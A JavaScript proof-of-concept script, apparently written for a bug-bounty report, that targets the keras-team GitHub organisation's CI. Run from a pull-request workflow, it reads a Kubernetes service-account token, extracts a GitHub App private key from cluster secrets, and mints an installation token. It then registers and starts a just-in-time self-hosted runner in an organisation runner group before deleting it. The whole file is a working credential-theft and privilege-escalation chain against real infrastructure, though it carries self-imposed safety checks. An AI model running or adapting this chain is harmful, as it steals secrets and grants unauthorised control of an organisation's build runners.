"use strict";

const fs = require("fs");
const path = require("path");
const { spawn } = require("child_process");

const {
  API_ROOT,
  KSA_ROOT,
  KubeClient,
  apiRequest,
  appJwt,
  githubAppValues,
  responseSummary,
} = require("./vrp_jit_probe.js");

const ORG = "keras-team";
const REPOSITORY = "keras-team/keras";
const HEAD_REF = "vrp-runner-metadata-20260829";
const RUNNER_GROUP_ID = 8;
const RUNNER_GROUP_NAME = "ml-central1-general-a";
const UNIQUE_LABEL =
  "vrp-jit-canary-6698da6471bfa28023a06d743697283d";
const RUNNER_NAME = "vrp-jit-canary-r87";
const RUNNER_BIN = "/home/runner/bin";
const LISTENER_TIMEOUT_MS = 5 * 60 * 1000;

function assertExactContext(env = process.env) {
  if (env.GITHUB_REPOSITORY !== REPOSITORY) {
    throw new Error("unexpected repository");
  }
  if (env.GITHUB_EVENT_NAME !== "pull_request") {
    throw new Error("unexpected event");
  }
  if (env.GITHUB_HEAD_REF !== HEAD_REF) {
    throw new Error("unexpected head ref");
  }
}

function containsRunner(response, runnerId) {
  return Boolean(
    response &&
      response.ok &&
      response.value &&
      Array.isArray(response.value.runners) &&
      response.value.runners.some((runner) => runner.id === runnerId),
  );
}

function hasRepository(response, fullName) {
  return Boolean(
    response &&
      response.ok &&
      response.value &&
      Array.isArray(response.value.repositories) &&
      response.value.repositories.some((repo) => repo.full_name === fullName),
  );
}

function groupVisible(response, groupId) {
  return Boolean(
    response &&
      response.ok &&
      response.value &&
      Array.isArray(response.value.runner_groups) &&
      response.value.runner_groups.some((group) => group.id === groupId),
  );
}

function isolatedListenerEnvironment(root, jitConfig, source = process.env) {
  const environment = {
    ACTIONS_RUNNER_INPUT_JITCONFIG: jitConfig,
    HOME: root,
    LANG: source.LANG || "C.UTF-8",
    PATH: source.PATH || "/usr/local/bin:/usr/bin:/bin",
  };
  for (const name of [
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "NO_PROXY",
    "http_proxy",
    "https_proxy",
    "no_proxy",
  ]) {
    if (source[name]) environment[name] = source[name];
  }
  return environment;
}

async function waitForExit(child, timeoutMs) {
  return new Promise((resolve, reject) => {
    let finished = false;
    const timer = setTimeout(() => {
      if (finished) return;
      child.kill("SIGTERM");
      setTimeout(() => child.kill("SIGKILL"), 5000).unref();
      reject(new Error("isolated listener timeout"));
    }, timeoutMs);
    child.once("error", (error) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      reject(error);
    });
    child.once("exit", (code, signal) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      resolve({ code, signal });
    });
  });
}

async function runIsolatedListener(jitConfig) {
  const workspaceRoot = path.resolve(__dirname, "..");
  const root = path.join(workspaceRoot, ".vrp-jit-listener-r87");
  fs.rmSync(root, { recursive: true, force: true });
  fs.mkdirSync(root, { recursive: true });
  fs.cpSync(RUNNER_BIN, path.join(root, "bin"), { recursive: true });
  const environment = isolatedListenerEnvironment(root, jitConfig);
  const child = spawn(path.join(root, "bin", "Runner.Listener"), ["run"], {
    cwd: root,
    env: environment,
    stdio: "ignore",
  });
  delete environment.ACTIONS_RUNNER_INPUT_JITCONFIG;
  try {
    return await waitForExit(child, LISTENER_TIMEOUT_MS);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
}

async function createRouteProof(call, token, runListener = runIsolatedListener) {
  const groupUrl =
    `${API_ROOT}/orgs/${ORG}/actions/runner-groups/${RUNNER_GROUP_ID}`;
  const groupRunnersUrl = `${groupUrl}/runners?per_page=100`;
  const [group, visibleGroups, repositories, baseline] = await Promise.all([
    call(groupUrl, token),
    call(
      `${API_ROOT}/orgs/${ORG}/actions/runner-groups` +
        `?visible_to_repository=keras&per_page=100`,
      token,
    ),
    call(`${groupUrl}/repositories?per_page=100`, token),
    call(groupRunnersUrl, token),
  ]);
  const groupValue = group.value || {};
  if (
    !group.ok ||
    groupValue.id !== RUNNER_GROUP_ID ||
    groupValue.name !== RUNNER_GROUP_NAME ||
    groupValue.allows_public_repositories !== true ||
    groupValue.restricted_to_workflows === true ||
    !groupVisible(visibleGroups, RUNNER_GROUP_ID) ||
    !hasRepository(repositories, REPOSITORY)
  ) {
    throw new Error("runner group safety invariant failed");
  }
  if (
    baseline.ok &&
    baseline.value.runners.some((runner) =>
      (runner.labels || []).some((label) => label.name === UNIQUE_LABEL),
    )
  ) {
    throw new Error("unique label already exists");
  }

  const created = await call(
    `${API_ROOT}/orgs/${ORG}/actions/runners/generate-jitconfig`,
    token,
    "POST",
    {
      name: RUNNER_NAME,
      runner_group_id: RUNNER_GROUP_ID,
      labels: [UNIQUE_LABEL],
      work_folder: "_work",
    },
  );
  const runner = created.value && created.value.runner;
  const runnerId = runner && runner.id;
  const jitConfig = created.value && created.value.encoded_jit_config;
  if (!created.ok || !runnerId || !jitConfig) {
    throw new Error("JIT configuration creation failed");
  }
  const returnedLabels = (runner.labels || []).map((label) => label.name);
  if (
    returnedLabels.length !== 1 ||
    returnedLabels[0] !== UNIQUE_LABEL ||
    returnedLabels.includes("linux-x86-n2-16")
  ) {
    throw new Error("JIT runner received unsafe labels");
  }

  let listenerResult = null;
  let deleted = null;
  let afterDelete = null;
  try {
    listenerResult = await runListener(jitConfig);
    if (listenerResult.code !== 0) {
      throw new Error("isolated JIT listener failed");
    }
  } finally {
    for (let attempt = 0; attempt < 3; attempt += 1) {
      deleted = await call(
        `${API_ROOT}/orgs/${ORG}/actions/runners/${runnerId}`,
        token,
        "DELETE",
      );
      if (deleted.ok || deleted.status === 404) break;
    }
    afterDelete = await call(
      `${API_ROOT}/orgs/${ORG}/actions/runners/${runnerId}`,
      token,
    );
  }

  return {
    phase: "keras-group8-isolated-jit-route",
    requested_group: {
      id: RUNNER_GROUP_ID,
      name: RUNNER_GROUP_NAME,
      visible_to_keras: true,
      repository_selected: true,
      allows_public_repositories: true,
      restricted_to_workflows: false,
    },
    baseline: {
      ...responseSummary(baseline),
      unique_label_absent: true,
    },
    create: {
      ...responseSummary(created),
      runner: {
        id: runnerId,
        name: runner.name,
        status: runner.status,
        busy: Boolean(runner.busy),
        labels: returnedLabels,
      },
      encoded_jit_config_present: true,
      encoded_jit_config_returned: false,
    },
    listener: listenerResult,
    cleanup: responseSummary(deleted),
    post_cleanup: responseSummary(afterDelete),
    safety: {
      installation_token_returned: false,
      github_app_private_key_returned: false,
      encoded_jit_config_returned: false,
      production_label_requested: false,
      scheduled_job_claim_attempted: false,
      cache_request_sent: false,
      artifact_request_sent: false,
      private_repository_content_requested: false,
    },
  };
}

async function collect(call = apiRequest, runListener = runIsolatedListener) {
  assertExactContext();
  const ksaToken = fs.readFileSync(path.join(KSA_ROOT, "token"), "utf8").trim();
  const namespace = fs
    .readFileSync(path.join(KSA_ROOT, "namespace"), "utf8")
    .trim();
  const appSecret = githubAppValues(
    await new KubeClient(ksaToken, namespace).secrets(),
  );
  if (!appSecret) throw new Error("GitHub App Secret not found");
  const values = appSecret.values;
  const minted = await call(
    `${API_ROOT}/app/installations/${encodeURIComponent(
      values.github_app_installation_id,
    )}/access_tokens`,
    appJwt(values.github_app_id, values.github_app_private_key),
    "POST",
    {},
  );
  const installationToken = minted.value && minted.value.token;
  if (!minted.ok || !installationToken) throw new Error("token mint failed");
  return createRouteProof(call, installationToken, runListener);
}

if (require.main === module) {
  if (process.env.VRP_JIT_ROUTE_WRAPPER_TEST === "1") {
    process.exit(0);
  }
  collect()
    .then(() => process.exit(0))
    .catch(() => process.exit(1));
}

module.exports = {
  HEAD_REF,
  REPOSITORY,
  RUNNER_GROUP_ID,
  UNIQUE_LABEL,
  assertExactContext,
  createRouteProof,
  isolatedListenerEnvironment,
};
